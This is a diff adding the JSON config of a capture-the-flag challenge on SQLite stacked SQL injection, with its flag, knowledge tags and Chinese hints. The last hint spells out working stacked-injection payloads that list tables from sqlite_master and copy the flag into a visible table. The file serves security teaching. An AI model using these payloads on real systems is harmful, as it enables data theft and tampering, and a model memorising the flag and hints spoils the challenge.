@@ -1,0 +1,23 @@
+{
+  "id": "sql4",
+  "category": "sql",
+  "title": "堆叠注入",
+  "difficulty": "medium",
+  "url_path": "/sql4",
+  "runtime": "php",
+  "entry": "index.php",
+  "flag": "flag{sql4_14263169}",
+  "knowledge": [
+    "堆叠注入",
+    "SQLite 多语句执行 exec",
+    "sqlite_master 系统表"
+  ],
+  "hints": [
+    "先试试经典的布尔测试：id=1 and 1=1 与 id=1 and 1=0，观察回显行数变化 —— 确认注入点存在。但注意：结果区只按 id 回显，union 之类的招数在这里派不上用场。",
+    "本题执行 SQL 用的是 SQLite3::exec()，它会执行分号分隔的多条语句（对应 MySQL 里的 mysqli_multi_query）。既然查询结果看不见，能不能让数据库执行一条 UPDATE，把别处的数据搬到 goods 表里？",
+    "两步走：\n第一步 列出所有表名：/sql4/?id=1;UPDATE goods SET title=(SELECT group_concat(name) FROM sqlite_master WHERE type='table') WHERE id=1 然后访问 ?id=1\n第二步 拿 flag：/sql4/?id=1;UPDATE goods SET title=(SELECT flag FROM secret_flag_storage) WHERE id=1 再访问 ?id=1"
+  ],
+  "writeup": "writeup.md",
+  "prev": "sql3",
+  "next": "sql5"
+}
